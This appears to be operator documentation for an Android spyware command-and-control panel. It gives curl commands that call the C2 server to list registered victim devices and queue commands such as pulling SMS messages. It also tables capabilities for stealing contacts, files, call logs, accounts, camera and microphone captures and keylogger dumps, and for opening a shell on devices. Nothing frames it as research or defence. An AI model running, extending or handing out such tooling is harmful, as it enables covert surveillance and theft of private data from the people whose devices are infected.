# Operator panel + API

## Web panel (Cloudflare Worker page)

```
https://anon-c2.YOUR.workers.dev/
https://anon-c2.YOUR.workers.dev/panel
```

Enter OPERATOR_TOKEN.

| Control | Meaning |
|---------|---------|
| **/online** | devices with lastSeen within 45s |
| **/users** | every device that registered the app |

## HTTP

```bash
export C2=https://anon-c2.YOUR.workers.dev
export TOKEN=your-operator-token

curl -s -H "Authorization: Bearer $TOKEN" $C2/users
curl -s -H "Authorization: Bearer $TOKEN" $C2/online

curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"deviceId":"UUID","name":"sms","args":{"limit":30}}' $C2/op/enqueue
```

## Commands

Core: info, geoloc, sms, contacts, clipboard, files, shell, cam, mic, screenshot

Added:

| name | purpose |
|------|---------|
| calllog | call history |
| accounts | device accounts |
| apps | non-system packages |
| wifi | current Wi-Fi |
| sim | SIM / operator |
| notifications | notification buffer status |
| keylog_dump | key buffer if accessibility enabled |
| persist_status | battery-opt status |
| push_text | local notification {title,body} |
| wipe_app_data | clear app cache / local files |
